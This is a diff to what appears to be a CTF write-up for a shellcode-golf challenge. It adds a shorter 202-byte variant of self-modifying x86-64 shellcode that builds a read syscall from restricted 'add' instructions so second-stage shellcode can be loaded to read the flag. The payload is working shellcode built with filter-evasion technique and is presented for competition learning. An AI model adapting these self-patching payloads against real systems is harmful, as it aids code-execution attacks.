@@ -57,7 +57,8 @@ add eax, 0x00050005
 add eax, 0x00050005
 add eax, 0x00050005
 add eax, 0x00010004
-add dword ptr [rip], eax ; creates nop; lea rsi, [rip]
+add dword ptr [rip], eax
+; creates nop; lea rsi, [rip]
 .byte 5
 .byte 5
 .byte 5
@@ -77,20 +78,23 @@ add al, 5
 add al, 5
 add al, 5
 add al, 2
-add byte ptr [rip], al ; creates mov edx, 0x500
+add byte ptr [rip], al
+; creates mov edx, 0x500
 .byte 0
 .byte 0
 .byte 5
 .byte 0
 .byte 0
-add byte ptr [rip], al ; creates mov edi, 0
+add byte ptr [rip], al
+; creates mov edi, 0
 .byte 5
 .byte 0
 .byte 0
 .byte 0
 .byte 0
 ; 308843ba
-add dword ptr [rip+1], eax ; double eax
+add dword ptr [rip+1], eax
+; double eax
 .byte 5
 .byte 0
 .byte 0
@@ -115,14 +119,16 @@ add eax, 0x00050005
 add eax, 0x00040005
 add al, 2
 ; 855f98c6
-add dword ptr [rip+1], eax ; double eax
+add dword ptr [rip+1], eax
+; double eax
 .byte 5
 .byte 0
 .byte 0
 .byte 0
 .byte 0
 ; 0abf318c
-add dword ptr [rip], eax ; creates nop; xor eax, eax; syscall
+add dword ptr [rip], eax
+; creates nop; xor eax, eax; syscall
 .byte 4
 .byte 0
 .byte 1
@@ -133,6 +139,115 @@ add dword ptr [rip], eax ; creates nop; xor eax, eax; syscall
 If you want to put this into `asm()` from pwntools you'll have to change the comments to `//`.
 
 This payload is 256 bytes long and sets up a read syscall to input normal open/read/write shellcode to get the flag. I used the "double `eax`" trick mostly to save space (instead of several `add` instructions). To find suitable numbers to target, I used `solve_mod` from Sage along with some guess and check. I didn't try that many numbers, and just used the first one I got that seemed reasonable.
+
+## Further Improvements
+After the CTF, I realized I could use the "double `eax`" trick at the beginning too, and also use this sequence to save one `add eax, 0x05050505`:
+
+```nasm
+add dword ptr [rip+1], eax
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+```
+
+This results in an even shorter solution:
+
+```nasm
+; 13371337
+add dword ptr [rip+1], eax
+; double eax + 0x05050505
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+; 2b732b73 -> 3088438b
+add eax, 0x05050505
+add eax, 0x00050505
+add eax, 0x00050505
+add eax, 0x00050505
+add eax, 0x00010404
+add dword ptr [rip], eax
+; creates nop; lea rsi, [rip]
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+; 3088438b
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 5
+add al, 2
+add byte ptr [rip], al
+; creates mov edx, 0x500
+.byte 0
+.byte 0
+.byte 5
+.byte 0
+.byte 0
+add byte ptr [rip], al
+; creates mov edi, 0
+.byte 5
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+; 308843ba
+add dword ptr [rip+1], eax
+; double eax
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+.byte 5
+; 66158c79
+add eax, 0x05050505
+add eax, 0x05050505
+add eax, 0x05050205
+add eax, 0x05050005
+add eax, 0x05050005
+add eax, 0x05050005
+add eax, 0x01050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00050005
+add eax, 0x00040005
+add al, 2
+; 855f98c6
+add dword ptr [rip+1], eax
+; double eax
+.byte 5
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+; 0abf318c
+add dword ptr [rip], eax
+; creates nop; xor eax, eax; syscall
+.byte 4
+.byte 0
+.byte 1
+.byte 5
+.byte 5
+```
+
+This is 202 bytes, but could probably be golfed down even more with some code to find optimal places to double `eax`.
 
 # Golf Curve
 I wrote my 256 byte solution in one try; that is, I had golfing in mind but only wrote until I had a working solution and did not golf it further from there. Thus, I felt that 256 bytes was a pretty reasonable length limit. The goal was to ensure that the author's solution was accepted within the first half of the CTF, but also to start the limit much lower to allow for more creative solutions. Additionally, the limit at the end of the CTF is supposed to be trivial to solve.
